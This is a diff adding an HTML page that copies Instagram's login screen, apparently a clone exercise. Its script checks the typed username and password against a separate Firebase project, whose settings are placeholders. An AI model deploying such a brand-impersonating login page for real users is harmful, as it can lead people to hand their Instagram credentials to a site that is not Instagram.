@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <title>Instagram</title>
+  <!-- Importar Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            <input type="text" class="c-panel__input" placeholder="Phone number, username, or email" id="username">
+            <input type="password" class="c-panel__input" placeholder="Password" id="password">
+            <a href="#" class="c-btn" id="loginBtn">Log In</a>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <a href="#" class="c-panel__facebook">Login with Facebook</a>
+          <a href="#" class="c-panel__forgot">Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span>Sign up</span></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+
+  <script>
+    // Configuración de Firebase
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Inicializar Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+
+    const loginButton = document.getElementById('loginBtn');
+
+    loginButton.addEventListener('click', async (event) => {
+      event.preventDefault(); // Evitar el comportamiento predeterminado del enlace
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Validar que los campos no estén vacíos
+      if (username && password) {
+          try {
+              await auth.signInWithEmailAndPassword(username, password);
+              alert('Inicio de sesión exitoso');
+          } catch (error) {
+              console.error('Error en el inicio de sesión:', error);
+              alert('Credenciales incorrectas');
+          }
+      } else {
+          alert('Por favor, completa todos los campos.');
+      }
+    });
+  </script>
+</body>
+</html>
